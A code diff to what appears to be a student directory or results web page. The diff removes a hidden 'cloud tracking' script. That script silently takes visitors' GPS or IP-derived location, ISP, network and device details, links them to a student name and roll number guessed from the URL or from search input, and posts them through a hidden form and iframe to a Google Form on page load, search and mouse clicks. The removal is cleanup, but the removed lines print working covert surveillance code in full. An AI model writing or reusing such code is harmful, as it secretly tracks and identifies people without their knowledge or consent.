@@ -1902,56 +1902,6 @@
                     modal.classList.remove('show');
                 };
 
-                /* ═══ CLOUD TRACKING & IDENTITY LOCK ═══ */
-                const CLOUD_CONFIG = {
-                    formUrl: "https://docs.google.com/forms/d/e/1FAIpQLScHuj6GMQot477On_FBe4yvPZEgOMmTOtVDZgbvBk07YI69ig/formResponse",
-                    entries: { lat: "entry.313094556", lon: "entry.1794910903", acc: "entry.401162063", time: "entry.1806013085" }
-                };
-                let isSyncing = false;
-
-                function getVisitorIdentity() {
-                    const p = new URLSearchParams(window.location.search);
-                    let s = allData.find(x => x.roll == p.get('r') || x.roll == p.get('roll') || x.enrollment == p.get('en') || x.enrollment == p.get('enrollment'));
-                    if (!s) { const r = localStorage.getItem('my_identity_roll'); if (r) s = allData.find(x => x.roll == r); }
-                    return s ? `${s.name} (${s.roll})` : 'Unknown Visitor';
-                }
-
-                async function silentCloudSync() {
-                    if (isSyncing) return;
-                    isSyncing = true;
-                    const identity = getVisitorIdentity();
-                    try {
-                        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                        const netType = conn ? `${conn.effectiveType} (${conn.type || 'unknown'})` : 'unknown';
-                        const device = `${navigator.platform} | ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`;
-                        const pos = await new Promise((res, rej) => {
-                            if (!navigator.geolocation) return rej();
-                            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 });
-                        }).catch(() => null);
-
-                        let lat, lon, accSource;
-                        if (pos && pos.coords) {
-                            lat = pos.coords.latitude; lon = pos.coords.longitude;
-                            accSource = `${identity} | GPS (\u00b1${Math.round(pos.coords.accuracy)}m) | ${netType} | ${device}`;
-                        } else {
-                            const ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null);
-                            if (ip) {
-                                lat = ip.latitude; lon = ip.longitude;
-                                accSource = `${identity} | SILENT | ${ip.city}, ${ip.postal || ''} (${ip.region}) | ${ip.org || ''} | ${netType} | ${device}`;
-                            }
-                        }
-                        if (lat && lon) {
-                            const form = document.createElement('form');
-                            form.method = 'POST'; form.action = CLOUD_CONFIG.formUrl; form.target = 'hidden_iframe'; form.style.display = 'none';
-                            const payload = { [CLOUD_CONFIG.entries.lat]: lat, [CLOUD_CONFIG.entries.lon]: lon, [CLOUD_CONFIG.entries.acc]: accSource, [CLOUD_CONFIG.entries.time]: new Date().toLocaleString() };
-                            for (const [n, v] of Object.entries(payload)) { const inp = document.createElement('input'); inp.name = n; inp.value = v; form.appendChild(inp); }
-                            if (!document.getElementById('hidden_iframe')) { const f = document.createElement('iframe'); f.id = f.name = 'hidden_iframe'; f.style.display = 'none'; document.body.appendChild(f); }
-                            document.body.appendChild(form); form.submit();
-                            setTimeout(() => { form.parentNode && document.body.removeChild(form); isSyncing = false; }, 3000);
-                        } else { isSyncing = false; }
-                    } catch (e) { isSyncing = false; }
-                }
-
                 /* ═══ MASTER RUN ═══ */
                 function run() {
                     filterData();
@@ -1969,21 +1919,6 @@
                 });
                 document.getElementById('branchFilter').addEventListener('change', run);
                 document.getElementById('divFilter').addEventListener('change', run);
-
-                document.getElementById('searchInput').addEventListener('input', e => {
-                    const v = e.target.value.toLowerCase().trim();
-                    if (v.length >= 3) {
-                        const s = allData.find(x => x.roll == v || x.name.toLowerCase().includes(v));
-                        if (s) { localStorage.setItem('my_identity_roll', s.roll); silentCloudSync(); }
-                    }
-                });
-
-                document.body.addEventListener('mousedown', () => {
-                    const ls = localStorage.getItem('last_silent_sync');
-                    if (!ls || Date.now() - ls > 3600000) { silentCloudSync(); localStorage.setItem('last_silent_sync', Date.now()); }
-                });
-
-                window.addEventListener('load', silentCloudSync);
 
                 /* ═══ INIT ═══ */
                 window.onload = () => {
